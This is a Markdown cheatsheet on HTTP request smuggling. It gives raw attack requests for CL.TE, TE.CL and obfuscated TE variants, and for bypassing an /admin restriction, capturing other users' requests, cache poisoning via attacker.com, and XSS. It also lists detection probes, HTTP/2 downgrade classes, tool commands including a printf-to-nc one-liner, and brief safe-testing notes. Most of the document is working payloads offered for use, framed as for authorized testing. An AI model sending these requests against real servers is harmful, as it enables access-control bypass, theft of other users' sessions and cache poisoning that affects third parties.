# 📦 HTTP Request Smuggling Cheatsheet

> **Review status:** Partial source review. The HTTP/2 update is current; legacy
> payload and tool sections still require verification.  
> **Scope:** Isolated labs or explicitly approved production-safe probes

```
  ██╗  ██╗████████╗████████╗██████╗     ███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ██╗███╗   ██╗ ██████╗ 
  ██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗    ██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██║████╗  ██║██╔════╝ 
  ███████║   ██║      ██║   ██████╔╝    ███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     ██║██╔██╗ ██║██║  ███╗
  ██╔══██║   ██║      ██║   ██╔═══╝     ╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██║██║╚██╗██║██║   ██║
  ██║  ██║   ██║      ██║   ██║         ███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║██║ ╚████║╚██████╔╝
  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝         ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

---

## 🎯 What is Request Smuggling

**HTTP Request Smuggling** exploits discrepancies between how front-end (proxy) and back-end servers parse HTTP requests, allowing injection of additional requests.

### Impact
- 🔴 **Bypass security controls** - WAF/ACL bypass
- 🔴 **Poison web cache** - Cache malicious responses
- 🔴 **Steal credentials** - Capture other users' requests
- 🔴 **XSS** - Reflected XSS via smuggled request

---

## 🔍 How It Works

### Headers Involved
```http
Content-Length: 13
Transfer-Encoding: chunked
```

### Vulnerability Types
| Type | Front-end uses | Back-end uses |
|------|----------------|---------------|
| CL.TE | Content-Length | Transfer-Encoding |
| TE.CL | Transfer-Encoding | Content-Length |
| TE.TE | Both obfuscated | One header ignored |

---

## 💉 Attack Payloads

### CL.TE (Content-Length → Transfer-Encoding)

**Front-end uses Content-Length, Back-end uses Transfer-Encoding**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Exploit:**
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: x
```

### TE.CL (Transfer-Encoding → Content-Length)

**Front-end uses Transfer-Encoding, Back-end uses Content-Length**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### TE.TE (Obfuscated Transfer-Encoding)

```http
# Obfuscate TE header
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: identity

Transfer-Encoding
 : chunked

Transfer-Encoding: xchunked

Transfer-Encoding: chunked#
```

---

## 🔥 Exploitation Examples

### Bypass Front-End Security
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
Foo: x
```

### Capture Other Users' Requests
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 100
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

data=
```
*Next user's request gets appended to `data=`*

### Cache Poisoning via Smuggling
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/script.js HTTP/1.1
Host: vulnerable.com
X-Ignore: X
GET /malicious HTTP/1.1
Host: attacker.com
Foo: x
```

### XSS via Smuggling
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /page?param=<script>alert(1)</script> HTTP/1.1
Host: vulnerable.com
Foo: x
```

---

## 🔍 Detection

### Timing-Based Detection
```http
# CL.TE Test
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X

# If back-end uses TE, it waits for "0" chunk
# Timeout = potentially vulnerable
```

### Differential Response
```http
# Send smuggled request that causes 404
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Foo: bar

# If next response is 404 = vulnerable
```

---

## HTTP/2 and Downgrade Cases

Modern front ends may receive HTTP/2 and translate requests to HTTP/1.1 for a back end. Test the protocol boundary, not only classic `Content-Length`/`Transfer-Encoding` conflicts.

| Class | Boundary to review |
|---|---|
| H2.CL | HTTP/2 framing versus an injected or trusted `Content-Length` after downgrade |
| H2.TE | HTTP/2 request carries a prohibited or mishandled `Transfer-Encoding` value |
| Request tunneling | Front end and back end disagree without reusing the connection in the classic way |
| HTTP/2 pseudo-headers | Ambiguous `:path`, `:authority`, scheme, or header normalization during translation |

Use single-user lab endpoints or collaboration-safe probes first. A timing anomaly alone is not sufficient: repeat the test, control connection reuse, and confirm the exact front-end/back-end parsing difference without poisoning another user's response.

### Safe Verification Principles

- Send a unique canary to an endpoint you control.
- Keep timeouts and request counts low.
- Avoid cacheable paths, authenticated victims, and shared production queues.
- Stop after proving the parser discrepancy.
- Record the negotiated protocol, connection reuse, proxy chain, and raw bytes.

---

## 🛠️ Tools

### Burp Suite Extension
```
1. Install "HTTP Request Smuggler" extension
2. Right-click request → Extensions → Launch Smuggle Probe
3. Check results for smuggling vulnerabilities
```

### smuggler.py
```bash
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -u https://target.com
```

### Manual with curl
```bash
# Note: curl normalizes headers, may need raw TCP
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | nc target.com 80
```

---

## 📊 Quick Reference

### Detection Checklist
```markdown
- [ ] Check for proxy/load balancer (multiple servers)
- [ ] Test CL.TE timing
- [ ] Test TE.CL timing
- [ ] Try TE header obfuscation
- [ ] Verify with differential response
```

### Common Indicators
```
- Load balancers (AWS ALB, HAProxy)
- Reverse proxies (nginx, Apache)
- CDNs (Cloudflare, Akamai)
- HTTP/2 to HTTP/1.1 downgrade
```

---

## ⚠️ Important Notes

```
1. Testing can disrupt other users
2. Use isolated test environments when possible
3. Add unique identifiers to detect your requests
4. Report responsibly with PoC
```

---

## 📚 Resources

- [PortSwigger HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [HTTP Desync Attacks (Albinowax)](https://portswigger.net/research/http-desync-attacks)
- [HTTP/2: The Sequel Is Always Worse](https://portswigger.net/research/http2)
- [Smuggler Tool](https://github.com/defparam/smuggler)

---

<p align="center">
  <b>📦 Smuggle Requests!</b><br>
  <i>For authorized testing only!</i>
</p>
